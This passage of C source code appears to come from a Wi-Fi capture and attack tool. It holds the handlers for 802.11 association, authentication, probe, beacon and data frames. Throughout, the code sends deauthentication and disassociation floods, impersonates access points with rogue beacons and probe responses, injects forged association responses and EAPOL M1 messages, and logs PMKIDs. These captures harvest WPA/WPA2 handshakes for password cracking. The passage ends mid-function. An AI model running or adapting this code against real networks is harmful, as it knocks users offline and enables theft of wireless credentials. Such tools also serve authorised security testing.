for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->addr, macfrx->addr1, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	zeiger->count += 1;
	if((zeiger->status &NET_REASSOC_REQ) != NET_REASSOC_REQ)
		{
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		zeiger->essidlen = tags.essidlen;
		memcpy(zeiger->essid, tags.essid, tags.essidlen);
		if((statusout &STATUS_ASSOC) == STATUS_ASSOC)
			{
			if((zeiger->status &NET_REASSOC_REQ) != NET_REASSOC_REQ)
				{
				printtimenetbothessid(macfrx->addr2, macfrx->addr1, zeiger->essidlen, zeiger->essid, message1);
				if(memcmp(&tags.pmkid, &zeroed32, 16) != 0)
					{
					snprintf(message2, 128, "PMKID:%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
							tags.pmkid[0], tags.pmkid[1], tags.pmkid[2], tags.pmkid[3], tags.pmkid[4], tags.pmkid[5], tags.pmkid[6], tags.pmkid[7],
							tags.pmkid[8], tags.pmkid[9], tags.pmkid[10], tags.pmkid[11], tags.pmkid[12], tags.pmkid[13], tags.pmkid[14], tags.pmkid[15]);
					printtimenetclientessid(macfrx->addr2, macfrx->addr1, zeiger->essidlen, zeiger->essid, message2);
					}
				}
			}
		zeiger->status |= NET_REASSOC_REQ;
		}
	return;
	}
ringbuffercount = zeiger -aplist;
memset(zeiger, 0, MACLIST_SIZE);
zeiger->timestamp = timestamp;
zeiger->status = NET_REASSOC_REQ;
zeiger->count = 1;
zeiger->dpv = DPC;
memcpy(zeiger->addr, macfrx->addr1, 6);
zeiger->essidlen = tags.essidlen;
memcpy(zeiger->essid, tags.essid, tags.essidlen);
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if((statusout &STATUS_ASSOC) == STATUS_ASSOC)
	{
	printtimenetbothessid(macfrx->addr2, macfrx->addr1, zeiger->essidlen, zeiger->essid, message1);
	if(memcmp(&tags.pmkid, &zeroed32, 16) != 0)
		{
		snprintf(message2, 128, "PMKID:%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
				tags.pmkid[0], tags.pmkid[1], tags.pmkid[2], tags.pmkid[3], tags.pmkid[4], tags.pmkid[5], tags.pmkid[6], tags.pmkid[7],
				tags.pmkid[8], tags.pmkid[9], tags.pmkid[10], tags.pmkid[11], tags.pmkid[12], tags.pmkid[13], tags.pmkid[14], tags.pmkid[15]);
		printtimenetclientessid(macfrx->addr2, macfrx->addr1, zeiger->essidlen, zeiger->essid, message2);
		}
	}
qsort(aplist, ringbuffercount +1, MACLIST_SIZE, sort_maclist_by_time);
return;
}
/*===========================================================================*/
static inline void process80211powersave_poll()
{
static maclist_t *zeiger;

if(macfrx->power == 1) return;
for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
	{
	if(memcmp(zeiger->addr, macfrx->addr1, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	if(zeiger->status >= NET_M1) return;
	if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)
		{
		send_ack();
		send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY);
		send_beacon_reactive(zeiger->addr, zeiger->essidlen, zeiger->essid);
		}
	return;
	break;
	}
if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS) send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY);
return;
}
/*===========================================================================*/
static inline void process80211null()
{
static maclist_t *zeiger;

if(macfrx->power == 1) return;
for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
	{
	if(memcmp(zeiger->addr, macfrx->addr1, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	if(zeiger->status >= NET_M1) return;
	if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS) send_ack();
	if((macfrx->to_ds == 1) && (macfrx->power == 0))
		{
		if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS) send_beacon_reactive(zeiger->addr, zeiger->essidlen, zeiger->essid);
		return;
		}
	if((macfrx->from_ds == 1) && (macfrx->power == 0))
		{
		if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS)
			{
			send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_STA_HAS_LEFT);
			send_beacon_reactive(zeiger->addr, zeiger->essidlen, zeiger->essid);
			}
		return;
		}
	}
if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)
	{
	if((macfrx->to_ds == 1) && (macfrx->power == 0))
		{
		send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY);
		return;
		}
	}
if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS)
	{
	if((macfrx->from_ds == 1) && (macfrx->power == 0)) send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_STA_HAS_LEFT);
	}
return;
}
/*===========================================================================*/
static inline void process80211data_wep()
{
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_WEP) == PCAPNG_FRAME_WEP) writeepb(fd_pcapng);
	}
return;
}
/*===========================================================================*/
static inline void process80211data_wpa()
{
static maclist_t *zeiger;

if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_WPA) == PCAPNG_FRAME_WPA) writeepb(fd_pcapng);
	}
for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->addr, macfrx->addr3, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	if(zeiger->status < NET_M1) break;
	return;
	}
if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS)
	{
	if(memcmp(macfrx->addr1, macfrx->addr3, 6) == 0)
		{
		send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_AP_BUSY);
		return;
		}
	}
if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)
	{
	if(memcmp(macfrx->addr2, macfrx->addr3, 6) == 0)
		{
		send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_STA_HAS_LEFT);
		return;
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211association_resp()
{
static maclist_t *zeiger;

for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->addr, macfrx->addr2, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	zeiger->count += 1;
	if((zeiger->status &NET_ASSOC_RESP) != NET_ASSOC_RESP)
		{
		if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_ack();
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		zeiger->status |= NET_ASSOC_RESP;
		}
	return;
	}
memset(zeiger, 0, MACLIST_SIZE);
zeiger->timestamp = timestamp;
zeiger->count = 1;
zeiger->dpv = DPC;
zeiger->status = NET_ASSOC_RESP;
memcpy(zeiger->addr, macfrx->addr2, 6);
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_ack();
if(fh_nmea != NULL) writegpwpl(zeiger->addr);
qsort(aplist, ringbuffercount +1, MACLIST_SIZE, sort_maclist_by_time);
return;
}
/*===========================================================================*/
static inline void process80211association_req()
{
static uint8_t *clientinfoptr;
static int clientinfolen;
static maclist_t *zeiger;
static const char *message = "ASSOCIATION";

static tags_t tags;

clientinfoptr = payloadptr +CAPABILITIESSTA_SIZE;
clientinfolen = payloadlen -CAPABILITIESSTA_SIZE;
if(clientinfolen < (int)IETAG_SIZE) return;
gettags(clientinfolen, clientinfoptr, &tags);
if(tags.essidlen == 0) return;
if(tags.essid[0] == 0) return;
for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->addr, macfrx->addr1, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	if((zeiger->status &NET_ASSOC_REQ) != NET_ASSOC_REQ)
		{
		zeiger->essidlen = tags.essidlen;
		memcpy(zeiger->essid, tags.essid, tags.essidlen);
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		if((statusout &STATUS_ASSOC) == STATUS_ASSOC) printtimenetbothessid(macfrx->addr2, macfrx->addr1, zeiger->essidlen, zeiger->essid, message);
		zeiger->status |= NET_ASSOC_REQ;
		}
	if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)
		{
		if(((tags.akm &TAK_PSK) == TAK_PSK) || ((tags.akm &TAK_PSKSHA256) == TAK_PSKSHA256))
			{
			if((tags.kdversion &KV_RSNIE) == KV_RSNIE)
				{
				send_ack();
				send_association_resp();
				send_m1_wpa2();
				}
			else if((tags.kdversion &KV_WPAIE) == KV_WPAIE)
				{
				send_ack();
				send_association_resp();
				send_m1_wpa1();
				}
			}
		}
	return;
	}
ringbuffercount = zeiger -aplist;
memset(zeiger, 0, MACLIST_SIZE);
zeiger->timestamp = timestamp;
zeiger->status = NET_ASSOC_REQ;
zeiger->count = 1;
zeiger->dpv = DPC;
memcpy(zeiger->addr, macfrx->addr1, 6);
zeiger->essidlen = tags.essidlen;
memcpy(zeiger->essid, tags.essid, tags.essidlen);
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if(fh_nmea != NULL) writegpwpl(zeiger->addr);
if((statusout &STATUS_ASSOC) == STATUS_ASSOC) printtimenetbothessid(macfrx->addr2, macfrx->addr1, zeiger->essidlen, zeiger->essid, message);
if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)
	{
	if(((tags.akm &TAK_PSK) == TAK_PSK) || ((tags.akm &TAK_PSKSHA256) == TAK_PSKSHA256))
		{
		if(memcmp(&mac_myclient, macfrx->addr1, 6) == 0)
			{
			if((tags.kdversion &KV_RSNIE) == KV_RSNIE)
				{
				send_ack();
				send_association_resp();
				send_m1_wpa2();
				}
			else if((tags.kdversion &KV_WPAIE) == KV_WPAIE)
				{
				send_ack();
				send_association_resp();
				send_m1_wpa1();
				}
			}
		}
	}
qsort(aplist, ringbuffercount +1, MACLIST_SIZE, sort_maclist_by_time);
return;
}
//*===========================================================================*/
static inline void process80211authentication_unknown()
{
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
return;
}
/*===========================================================================*/
static inline void process80211authentication_resp()
{
static authf_t *auth;
static maclist_t *zeiger;
static const char *msgptr;
static const char *message1 = "AUTHENTICATION SHARED KEY ENCRYPTED";
static const char *message2 = "AUTHENTICATION OPEN SYSTEM";
static const char *message3 = "AUTHENTICATION SAE";
static const char *message4 = "AUTHENTICATION SHARED KEY";
static const char *message5 = "AUTHENTICATION FAST TRANSITION";
static const char *message6 = "AUTHENTICATION FILS";
static const char *message7 = "AUTHENTICATION FILS PFS";
static const char *message8 = "AUTHENTICATION FILS PK";
static const char *message9 = "AUTHENTICATION NETWORK EAP";
static const char *message10 = "AUTHENTICATION UNKNOWN";

auth = (authf_t*)payloadptr;
if(payloadlen < (int)AUTHENTICATIONFRAME_SIZE) return;
for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->addr, macfrx->addr2, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	zeiger->count += 1;
	zeiger->algorithm = auth->algorithm;
	if((zeiger->status &NET_AUTH) != NET_AUTH)
		{
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		zeiger->status |= NET_AUTH;
		}
	if(zeiger->status < NET_M1)
		{
		if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS)
			{
			if((zeiger->algorithm == OPEN_SYSTEM) && (auth->statuscode == AUTH_OK))
				{
				if(memcmp(&mac_myclient, macfrx->addr1, 6) == 0)
					{
					if((zeiger->kdversion &KV_RSNIE) == KV_RSNIE) send_association_req_wpa2(zeiger);
					else if((zeiger->kdversion &KV_WPAIE) == KV_WPAIE) send_association_req_wpa1(zeiger);
					}
				}
			}
		}
	return;
	}
memset(zeiger, 0, MACLIST_SIZE);
memcpy(zeiger->addr, macfrx->addr2, 6);
zeiger->timestamp = timestamp;
zeiger->count = 1;
zeiger->dpv = DPC;
zeiger->status = NET_AUTH;
zeiger->algorithm = auth->algorithm;
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if(fh_nmea != NULL) writegpwpl(zeiger->addr);
if((statusout &STATUS_AUTH) == STATUS_AUTH)
	{
	if(macfrx->prot == 1) msgptr = message1;
	else if(auth->algorithm == OPEN_SYSTEM)	msgptr = message2;
	else if(auth->algorithm == SAE)	msgptr = message3;
	else if(auth->algorithm == SHARED_KEY) msgptr = message4;
	else if(auth->algorithm == FBT)	msgptr = message5;
	else if(auth->algorithm == FILS) msgptr = message6;
	else if(auth->algorithm == FILSPFS) msgptr = message7;
	else if(auth->algorithm == FILSPK) msgptr = message8;
	else if(auth->algorithm == NETWORKEAP) msgptr = message9;
	else msgptr = message10;
	printtimenetbothessid(macfrx->addr1, macfrx->addr2, zeiger->essidlen, zeiger->essid, msgptr);
	}
qsort(aplist, ringbuffercount +1, MACLIST_SIZE, sort_maclist_by_time);
return;
}
/*===========================================================================*/
static inline void process80211authentication_req()
{
static authf_t *auth;
static maclist_t *zeiger;
static const char *msgptr;
static const char *message1 = "AUTHENTICATION SHARED KEY ENCRYPTED";
static const char *message2 = "AUTHENTICATION OPEN SYSTEM";
static const char *message3 = "AUTHENTICATION SAE";
static const char *message4 = "AUTHENTICATION SHARED KEY";
static const char *message5 = "AUTHENTICATION FAST TRANSITION";
static const char *message6 = "AUTHENTICATION FILS";
static const char *message7 = "AUTHENTICATION FILS PFS";
static const char *message8 = "AUTHENTICATION FILS PK";
static const char *message9 = "AUTHENTICATION NETWORK EAP";
static const char *message10 = "AUTHENTICATION UNKNOWN";

if(memcmp(macfrx->addr1, &zeroed32, 6) == 0) return;
auth = (authf_t*)payloadptr;
if(payloadlen < (int)AUTHENTICATIONFRAME_SIZE) return;
for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->addr, macfrx->addr1, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	if((zeiger->status &NET_AUTH) != NET_AUTH)
		{
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		zeiger->status |= NET_AUTH;
		}
	zeiger->algorithm = auth->algorithm;
	if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)
		{
		if(auth->algorithm == OPEN_SYSTEM)
			{
			send_ack();
			send_authentication_resp_opensystem();
			}
		}
	return;
	}
memset(zeiger, 0, MACLIST_SIZE);
memcpy(zeiger->addr, macfrx->addr1, 6);
zeiger->timestamp = timestamp;
zeiger->count = 1;
zeiger->dpv = DPC;
zeiger->status = NET_AUTH;
zeiger->algorithm = auth->algorithm;
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if((statusout &STATUS_AUTH) == STATUS_AUTH)
	{
	if(macfrx->prot == 1) msgptr = message1;
	else if(auth->algorithm == OPEN_SYSTEM)	msgptr = message2;
	else if(auth->algorithm == SAE)	msgptr = message3;
	else if(auth->algorithm == SHARED_KEY) msgptr = message4;
	else if(auth->algorithm == FBT)	msgptr = message5;
	else if(auth->algorithm == FILS) msgptr = message6;
	else if(auth->algorithm == FILSPFS) msgptr = message7;
	else if(auth->algorithm == FILSPK) msgptr = message8;
	else if(auth->algorithm == NETWORKEAP) msgptr = message9;
	else msgptr = message10;
	printtimenetbothessid(macfrx->addr2, macfrx->addr1, zeiger->essidlen, zeiger->essid, msgptr);
	}
if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)
	{
	if(auth->algorithm == OPEN_SYSTEM)
		{
		send_ack();
		send_authentication_resp_opensystem();
		}
	}
qsort(aplist, ringbuffercount +1, MACLIST_SIZE, sort_maclist_by_time);
return;
}
/*===========================================================================*/
static inline void process80211probe_req_directed()
{
static maclist_t *zeiger;
static const char *message = "DIRECTED PROBE REQUEST";
static tags_t tags;

if(payloadlen < (int)IETAG_SIZE) return;
gettags(payloadlen, payloadptr, &tags);
if(tags.essidlen == 0) return;
if(tags.essid[0] == 0) return;
for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->addr, macfrx->addr1, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	if((zeiger->status &NET_PROBE_REQ) != NET_PROBE_REQ)
		{
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		zeiger->essidlen = tags.essidlen;
		memcpy(zeiger->essid, tags.essid, tags.essidlen);
		if((statusout &STATUS_PROBES) == STATUS_PROBES) printtimenetclientessid(macfrx->addr2, macfrx->addr1, zeiger->essidlen, zeiger->essid, message);
		zeiger->status |= NET_PROBE_REQ;
		}
	if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)
		{
		send_probe_resp(zeiger->addr, zeiger->essidlen, zeiger->essid);
		send_beacon_reactive(zeiger->addr, zeiger->essidlen, zeiger->essid);
		}
	return;
	}
ringbuffercount = zeiger -aplist;
memset(zeiger, 0, MACLIST_SIZE);
zeiger->timestamp = timestamp;
zeiger->status = NET_PROBE_REQ;
zeiger->count = 1;
zeiger->dpv = DPC;
memcpy(zeiger->addr, macfrx->addr1, 6);
zeiger->essidlen = tags.essidlen;
memcpy(zeiger->essid, tags.essid, tags.essidlen);
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if((statusout &STATUS_PROBES) == STATUS_PROBES) printtimenetclientessid(macfrx->addr2, zeiger->addr, zeiger->essidlen, zeiger->essid, message);
if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)
	{
	send_probe_resp(zeiger->addr, zeiger->essidlen, zeiger->essid);
	send_beacon_reactive(zeiger->addr, zeiger->essidlen, zeiger->essid);
	}
qsort(aplist, ringbuffercount +1, MACLIST_SIZE, sort_maclist_by_time);
return;
}
/*===========================================================================*/
static inline void process80211probe_req()
{
static maclist_t *zeiger;
static const char *message = "PROBE REQUEST";
static tags_t tags;

if(payloadlen < (int)IETAG_SIZE) return;
gettags(payloadlen, payloadptr, &tags);
if(tags.essidlen == 0) return;
if(tags.essid[0] == 0) return;
for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(zeiger->essidlen != tags.essidlen) continue;
	if(memcmp(zeiger->essid, tags.essid, tags.essidlen) != 0) continue;
	zeiger->timestamp = timestamp;
	zeiger->count += 1;
	if((zeiger->status &NET_PROBE_REQ) != NET_PROBE_REQ)
		{
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		zeiger->essidlen = tags.essidlen;
		memcpy(zeiger->essid, tags.essid, tags.essidlen);
		if((statusout &STATUS_PROBES) == STATUS_PROBES) printtimenetclientessid(macfrx->addr2, macfrx->addr1, zeiger->essidlen, zeiger->essid, message);
		zeiger->status |= NET_PROBE_REQ;
		}
	if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)
		{
		send_probe_resp(zeiger->addr, zeiger->essidlen, zeiger->essid);
		send_beacon_reactive(zeiger->addr, zeiger->essidlen, zeiger->essid);
		}
	if(beaconreactiveflag == true) send_beacon_aplist();
	return;
	}
ringbuffercount = zeiger -aplist;
memset(zeiger, 0, MACLIST_SIZE);
zeiger->timestamp = timestamp;
zeiger->status = NET_PROBE_REQ;
zeiger->count = 1;
zeiger->dpv = DPC;
memcpy(zeiger->addr, &mac_myap, 3);
zeiger->addr[3] = (mynic_ap >> 16) & 0xff;
zeiger->addr[4] = (mynic_ap >> 8) & 0xff;
zeiger->addr[5] = mynic_ap & 0xff;
mynic_ap++;
zeiger->essidlen = tags.essidlen;
memcpy(zeiger->essid, tags.essid, tags.essidlen);
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if((statusout &STATUS_PROBES) == STATUS_PROBES) printtimenetclientessid(macfrx->addr2, macfrx->addr1, zeiger->essidlen, zeiger->essid, message);
if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS)
	{
	send_probe_resp(zeiger->addr, zeiger->essidlen, zeiger->essid);
	send_beacon_reactive(zeiger->addr, zeiger->essidlen, zeiger->essid);
	}
if(beaconreactiveflag == true) send_beacon_aplist();
qsort(aplist, ringbuffercount +1, MACLIST_SIZE, sort_maclist_by_time);
return;
}
/*===========================================================================*/
static inline void process80211probe_resp()
{
static int apinfolen;
static uint8_t *apinfoptr;
static maclist_t *zeiger;
static const char *message = "PROBE RESPONSE";
static tags_t tags;

if(payloadlen < (int)CAPABILITIESAP_SIZE +IETAG_SIZE) return;
apinfoptr = payloadptr +CAPABILITIESAP_SIZE;
apinfolen = payloadlen -CAPABILITIESAP_SIZE;
gettags(apinfolen, apinfoptr, &tags);
for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->addr, macfrx->addr2, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	zeiger->count += 1;
	if((zeiger->status &NET_PROBE_RESP) != NET_PROBE_RESP)
		{
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		zeiger->essidlen = tags.essidlen;
		memcpy(zeiger->essid, tags.essid, tags.essidlen);
		if((statusout &STATUS_PROBES) == STATUS_PROBES)	printtimenetapessid(macfrx->addr1, macfrx->addr2, zeiger->essidlen, zeiger->essid, message);
		zeiger->status |= NET_PROBE_RESP;
		}
	if(zeiger->status < NET_M1)
		{
		if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS)
			{
			if(memcmp(macfrx->addr1, &mac_myclient, 6) == 0)
				{
				if(((tags.akm &TAK_PSK) == TAK_PSK) || ((tags.akm &TAK_PSKSHA256) == TAK_PSKSHA256)) send_authentication_req_opensystem(macfrx->addr2);
				}
			}
		}
	if((zeiger->count %zeiger->dpv) == 0)
		{
		if(zeiger->status >= NET_M3 + NET_M4) return;
			{
			if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_deauthentication_broadcast(macfrx->addr2, WLAN_REASON_UNSPECIFIED);
			}
		zeiger->dpv += 1;
		}
	return;
	}
ringbuffercount = zeiger -aplist;
memset(zeiger, 0, MACLIST_SIZE);
zeiger->timestamp = timestamp;
zeiger->count = 1;
zeiger->dpv = DPC;
zeiger->status = NET_PROBE_RESP;
memcpy(zeiger->addr, macfrx->addr2, 6);
zeiger->channel = tags.channel;
zeiger->kdversion = tags.kdversion;
zeiger->groupcipher = tags.groupcipher;
zeiger->cipher = tags.cipher;
zeiger->akm = tags.akm;
zeiger->essidlen = tags.essidlen;
memcpy(zeiger->essid, tags.essid, ESSID_LEN_MAX);
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if(fh_nmea != NULL) writegpwpl(zeiger->addr);
if((statusout &STATUS_PROBES) == STATUS_PROBES)	printtimenetapessid(macfrx->addr1, macfrx->addr2, zeiger->essidlen, zeiger->essid, message);
if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS)
	{
	if(memcmp(macfrx->addr1, &mac_myclient, 6) == 0)
		{
		if(((tags.akm &TAK_PSK) == TAK_PSK) || ((tags.akm &TAK_PSKSHA256) == TAK_PSKSHA256)) send_authentication_req_opensystem(macfrx->addr2);
		}
	send_deauthentication_broadcast(macfrx->addr2, WLAN_REASON_UNSPECIFIED);
	}
qsort(aplist, ringbuffercount +1, MACLIST_SIZE, sort_maclist_by_time);
return;
}
/*===========================================================================*/
static inline void process80211beacon()
{
static int apinfolen;
static uint8_t *apinfoptr;
static maclist_t *zeiger;
static const char *message = "BEACON";
static tags_t tags;

if(payloadlen < (int)CAPABILITIESAP_SIZE +IETAG_SIZE) return;
apinfoptr = payloadptr +CAPABILITIESAP_SIZE;
apinfolen = payloadlen -CAPABILITIESAP_SIZE;
for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->addr, macfrx->addr2, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	zeiger->count += 1;
	if((zeiger->status &NET_BEACON) != NET_BEACON)
		{
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		zeiger->status |= NET_BEACON;
		}
	if((zeiger->status &NET_PROBE_RESP) != NET_PROBE_RESP)
		{
		if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_proberequest_directed(macfrx->addr2, zeiger->essidlen, zeiger->essid);
		}
	if((zeiger->count %zeiger->dpv) == 0)
		{
		if(zeiger->status >= NET_M3 + NET_M4) return;
			{
			if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_deauthentication_broadcast(macfrx->addr2, WLAN_REASON_UNSPECIFIED);
			}
		zeiger->dpv += 1;
		return;
		}
	if(zeiger->count > RECHECKCOUNT)
		{
		zeiger->count = 1;
		zeiger->dpv = DPC;
		if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_proberequest_directed(macfrx->addr2, zeiger->essidlen, zeiger->essid);
		zeiger->status &= 0xfffd;
		return;
		}
	return;
	}
ringbuffercount = zeiger -aplist;
gettags(apinfolen, apinfoptr, &tags);
memset(zeiger, 0, MACLIST_SIZE);
zeiger->timestamp = timestamp;
zeiger->count = 1;
zeiger->dpv = DPC;
zeiger->status = NET_BEACON;
memcpy(zeiger->addr, macfrx->addr2, 6);
zeiger->channel = tags.channel;
zeiger->kdversion = tags.kdversion;
zeiger->groupcipher = tags.groupcipher;
zeiger->cipher = tags.cipher;
zeiger->akm = tags.akm;
zeiger->essidlen = tags.essidlen;
memcpy(zeiger->essid, tags.essid, tags.essidlen);
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if(fh_nmea != NULL) writegpwpl(zeiger->addr);
if((statusout &STATUS_BEACON) == STATUS_BEACON)	printtimenetapessid(macfrx->addr1, macfrx->addr2, zeiger->essidlen, zeiger->essid, message);
if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS)
	{
	send_proberequest_directed(macfrx->addr2, zeiger->essidlen, zeiger->essid);
	send_deauthentication_broadcast(macfrx->addr2, WLAN_REASON_UNSPECIFIED);
	}
qsort(aplist, ringbuffercount +1, MACLIST_SIZE, sort_maclist_by_time);
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline bool set_channel()
{
static struct iwreq pwrq;

memset(&pwrq, 0, sizeof(pwrq));
strncpy(pwrq.ifr_name, interfacename, IFNAMSIZ -1);
pwrq.u.freq.e = 0;
pwrq.u.freq.flags = IW_FREQ_FIXED;
pwrq.u.freq.m = channelscanlist[cpa];
if(ioctl(fd_socket, SIOCSIWFREQ, &pwrq) < 0) return false;
return true;
}
/*===========================================================================*/
static inline void process_gps()
{
static char *nmeaptr;
